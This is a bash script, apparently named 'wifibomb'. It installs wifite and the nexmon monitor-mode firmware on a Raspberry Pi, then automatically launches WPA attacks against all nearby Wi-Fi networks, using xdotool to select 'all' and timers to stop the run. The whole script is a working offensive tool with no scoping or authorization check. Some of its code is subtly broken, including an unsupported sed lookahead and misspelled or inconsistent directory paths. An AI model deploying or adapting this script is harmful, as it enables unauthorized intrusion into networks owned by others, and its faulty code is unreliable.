#!/bin/bash

## This is a pretty cool program and this will be a basic desciption of it.

## Important Variables
declare -a COMPATIBLE_DISTROS=("Distributor ID:	Raspbian" "Distributor ID:	Ubuntu" "Distributor ID:	Debian"  "Distributor ID:	ManjaroLinux")

## These variables can be modified to change the amount of time that the script
## will spend scanning, then actually running. The synax for these values is a
## numerical value, then a character to define a unit of time. 
## E.g. s: for second, m: for minute, d: for day
SCAN_TIME=10s
RUN_TIME=10s

## 
DEP_FILE=/etc/wifibomb_deps

function locate_module() {
	ORIGINAL_LOCATION=`pwd`
	MODULE_LOCATION=`modinfo -F filename brcmfmac | sed -n -e 's/.*\/(?!\/brcmfmac.ko) //p'`
}

function process_killer() {
	PID=`pidof python2 /usr/bin/wifite`
	kill -s SIGINT $PID
}

function network_selection() {
	xdotool key a l l; xdotool key Return
	sleep $RUN_TIME
	$(process_killer)
	$(process_killer)
}

function kill_scan() {
	sleep $SCAN_TIME
	$(process_killer)
	$(network_selection)
}

function main() {
	$(kill_scan) &
	wifite -wpa -wpat 120

}

function install_dependencies() {
	if [ ! -f "$DEP_FILE" ]; then
		echo "Installing dependencies: The system will automatically reboot when finished"
		apt update

		# Install wifite and xdotools (both dependencies of this script)
		echo y | apt install wifite xdotool

		# Install nexmon custom firmware (to allow pi's card to be put in monitor mode)
		echo y | apt install git libgmp3-dev gawk qpdf bison flex make raspberrypi-kernel-headers
		git clone https://github.com/seemoo-lab/nexmon.git
		
		cd nexmon/buildtools/isl-0.10
		./configure
		make
		make install
		ln -s /usr/local/lib/libisl.so /usr/lib/arm-linux-gnueabihf/libisl.so.10		

		cd
		source setup_env.sh
		make
		cd patches/bcm43455c0/7_45_189/nexmon/
		make
		make backup-firmware
		make install-firmware
		cd nexmon && cd utililities/nexutil
		make 
		make install
		locate_module
		mv "$MODULE_LOCATION"/brcmfmac.ko "$MODULE_LOCATION"/brcmfmac.ko.orig
		cd nexmon && cp patches/bcm43455c0/7_45_189/nexmon/brcmfmac_4.19.y-nexmon/brcmfmac.ko "$MODULE_LOCATION"
		depmod -a

		# Create file to prevent this from being run again
		touch $DEP_FILE

		reboot
	else
		echo "Dependencies are already installed"
	fi
}

function distro_checker() {
	DISTRO=`lsb_release -i`
	for POSSIBLE_DISTRO in "${COMPATIBLE_DISTROS[@]}"; do
		if [ "$POSSIBLE_DISTRO" == "$DISTRO" ]; then
			RESULT=1
			break
		else
			RESULT=0
		fi
	done
}

if [ "$(id -u)" == 0 ]; then
	echo -e "  ▄█     █▄   ▄█     ▄████████  ▄█       ▀█████████▄   ▄██████▄    ▄▄▄▄███▄▄▄▄   ▀█████████▄  \n ███     ███ ███    ███    ███ ███         ███    ███ ███    ███ ▄██▀▀▀███▀▀▀██▄   ███    ███ \n ███     ███ ███▌   ███    █▀  ███▌        ███    ███ ███    ███ ███   ███   ███   ███    ███ \n ███     ███ ███▌  ▄███▄▄▄     ███▌       ▄███▄▄▄██▀  ███    ███ ███   ███   ███  ▄███▄▄▄██▀  \n ███     ███ ███▌ ▀▀███▀▀▀     ███▌      ▀▀███▀▀▀██▄  ███    ███ ███   ███   ███ ▀▀███▀▀▀██▄  \n ███     ███ ███    ███        ███         ███    ██▄ ███    ███ ███   ███   ███   ███    ██▄ \n ███ ▄█▄ ███ ███    ███        ███         ███    ███ ███    ███ ███   ███   ███   ███    ███ \n  ▀███▀███▀  █▀     ███        █▀        ▄█████████▀   ▀██████▀   ▀█   ███   █▀  ▄█████████▀  \n"
	echo  -e "\033[5m\e[32mthe bomb has been planted...\033[0m"
	distro_checker
	if [ $RESULT == 0 ]; then
		echo "Automatic dependency installation is not supported on this distribution. You must install all dependencies manually"
	elif [ $RESULT == 1 ]; then
		install_dependencies
	fi
	main
else
	echo "This program needs to be run as root"
fi